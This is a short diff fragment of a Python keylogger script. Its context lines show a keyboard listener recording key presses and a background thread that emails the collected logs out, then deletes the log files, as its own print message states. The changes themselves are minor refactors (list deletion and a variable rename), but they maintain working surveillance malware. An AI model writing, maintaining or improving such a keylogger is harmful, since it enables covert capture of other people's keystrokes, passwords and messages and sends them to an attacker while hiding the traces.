@@ -118,9 +118,9 @@ def send_logs():
                 setup.close()
 
                 os.remove(toDeleteFile[0])
-
-                displayData = displayData[1:]
-                toDeleteFile = []
+                del displayData[1:]
+                del toDeleteFile[0:]
+                print('delete data/files')
                 print("deleting the log once we've sent to our email")
 
             except:
@@ -128,9 +128,8 @@ def send_logs():
 
 
 if __name__=='__main__':
-	Thread = threading.Thread(target=send_logs)
-	Thread.start()
+	thread = threading.Thread(target=send_logs)
+	thread.start()
 
 	with Listener(on_press=on_press) as listener:
 		listener.join()
-
